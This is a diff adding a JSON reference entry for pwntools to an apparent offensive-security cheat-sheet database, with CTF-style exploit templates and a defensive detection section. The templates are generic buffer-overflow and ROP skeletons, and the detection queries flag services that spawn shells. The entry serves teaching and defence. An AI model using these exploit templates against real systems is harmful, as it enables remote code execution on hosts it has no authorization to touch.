@@ -1,0 +1,103 @@
+{
+  "id": "re-pwntools",
+  "name": "pwntools - CTF / Exploit Development Framework",
+  "command": "python3 -c 'from pwn import *; io=process(\"./vuln\"); io.interactive()'",
+  "description": "pwntools is a Python library for exploit development and CTF binary exploitation. It streamlines connecting to local/remote targets, packing addresses, building ROP chains, crafting shellcode, handling I/O, and leaking/overwriting memory - turning a crash into a working exploit quickly.",
+  "platform": "linux",
+  "type": "command",
+  "opsec": "moderate",
+  "category": "Reverse Engineering",
+  "subcategory": "Exploit Development",
+  "certifications": [
+    "OSCP"
+  ],
+  "primary_cert": "OSCP",
+  "source": "Gallopsled/pwntools",
+  "tags": [
+    "pwntools",
+    "exploit-dev",
+    "rop",
+    "shellcode",
+    "ctf",
+    "buffer-overflow",
+    "binary-exploitation"
+  ],
+  "mitre": [
+    "T1203",
+    "T1587.004"
+  ],
+  "exam": "exam-ok",
+  "notes": "=== INSTALL ===\n  pip install pwntools\n\n=== SKELETON ===\n  from pwn import *\n  context.binary = elf = ELF('./vuln')     # sets arch/bits/endian\n  context.log_level = 'debug'\n  # io = process('./vuln')                 # local\n  io = remote('<ip>', <port>)              # remote\n\n=== BUILD THE PAYLOAD ===\n  offset = 72\n  payload  = b'A'*offset\n  payload += p64(elf.sym['win'])           # pack address (64-bit)\n  io.sendline(payload)\n  io.interactive()\n\n=== ROP ===\n  rop = ROP(elf)\n  rop.call('system', [next(elf.search(b'/bin/sh'))])\n  payload = flat({offset: rop.chain()})\n\n=== LEAKS / FORMAT STRING ===\n  leak = u64(io.recvline().strip().ljust(8, b'\\x00'))\n  libc = ELF('./libc.so.6'); libc.address = leak - libc.sym['puts']\n\n=== HELPERS ===\n  cyclic(200) / cyclic_find(0x6161616c)    # find EIP/RIP offset\n  shellcraft.sh() ; asm(shellcraft.sh())\n  checksec ./vuln                          # (pwntools CLI) show mitigations\n\n=== ALTERNATIVES ===\n  ROPgadget / ropper   # gadget finding\n  one_gadget           # libc one-shot RCE gadgets\n  gdb + pwndbg/gef     # dynamic analysis",
+  "examples": [
+    {
+      "label": "Find offset with cyclic pattern",
+      "command": "python3 -c 'from pwn import *; print(cyclic(200))'"
+    },
+    {
+      "label": "Remote ret2win skeleton",
+      "command": "python3 -c 'from pwn import *; e=ELF(\"./vuln\"); io=remote(\"<ip>\",<port>); io.sendline(b\"A\"*72+p64(e.sym[\"win\"])); io.interactive()'"
+    },
+    {
+      "label": "Show mitigations",
+      "command": "checksec ./vuln"
+    }
+  ],
+  "references": [
+    {
+      "title": "pwntools docs",
+      "url": "https://docs.pwntools.com/"
+    },
+    {
+      "title": "pwntools GitHub",
+      "url": "https://github.com/Gallopsled/pwntools"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "re-ropgadget",
+      "note": "ROPgadget to source gadgets for pwntools ROP chains.",
+      "rel": "next"
+    },
+    {
+      "id": "re-one-gadget",
+      "note": "one_gadget for a libc single-shot RCE.",
+      "rel": "next"
+    },
+    {
+      "id": "app-service-gdb",
+      "note": "gdb/pwndbg for dynamic analysis of the crash.",
+      "rel": "prereq"
+    }
+  ],
+  "defense": {
+    "why_it_works": "Memory-corruption bugs (overflows, use-after-free, format strings) let an attacker control execution flow. pwntools automates the mechanics (offset finding, address packing, ROP, leaks) so exploitation of a vulnerable, under-hardened binary is fast and reliable.",
+    "prerequisites": "A memory-corruption vulnerability in the target binary; network/local access to trigger it.",
+    "impact": "Reliable remote/local code execution or privilege escalation by exploiting the vulnerable process.",
+    "detection": "[MITRE T1203] On the target: repeated process crashes/segfaults preceding success, EDR memory-protection alerts (ROP/stack-pivot), WER/core-dump bursts, and anomalous child processes (shell) from a service.",
+    "artifacts": "Core dumps and segfault logs (dmesg, /var/log), EDR exploit-guard events, unexpected /bin/sh child of a network service, crash-loop telemetry.",
+    "splunk_spl": "index=linux sourcetype=linux:syslog (segfault OR \"general protection\" OR core_dumped)\n| stats count by host, process\n| where count > 3",
+    "elastic_kql": "message:(segfault or core_dumped) or process.parent.name:(nginx or apache2 or custom-service) and process.name:(sh or bash or dash)",
+    "sentinel_kql": "Syslog\n| where SyslogMessage has_any (\"segfault\",\"core dumped\",\"general protection\")\n| summarize Count=count() by HostName, ProcessName, bin(TimeGenerated, 5m)\n| where Count > 3",
+    "sigma_rules": "linux_service_crashloop_then_shell",
+    "prevention": "Build with all mitigations (NX/DEP, ASLR/PIE, stack canaries, RELRO, CFG/CET); fuzz and fix memory bugs; use memory-safe languages for new code; sandbox/seccomp network services; EDR exploit protection; restart-on-crash with alerting so crash-looping is visible.",
+    "sources": [
+      "Gallopsled/pwntools",
+      "https://attack.mitre.org/techniques/T1203/"
+    ],
+    "detections": [
+      {
+        "platform": "sentinel",
+        "name": "Service crash-loop followed by shell (exploitation)",
+        "logic": "Syslog\n| where SyslogMessage has_any (\"segfault\",\"core dumped\",\"general protection\")\n| summarize Count=count() by HostName, ProcessName, bin(TimeGenerated, 5m)\n| where Count > 3",
+        "data_source": "linux-syslog",
+        "attack": [
+          "T1203"
+        ],
+        "fidelity": "telemetry",
+        "confidence": "medium",
+        "false_positives": "Buggy software crashing legitimately",
+        "tuning": "Correlate crash bursts with a new child shell or outbound connection"
+      }
+    ]
+  }
+}
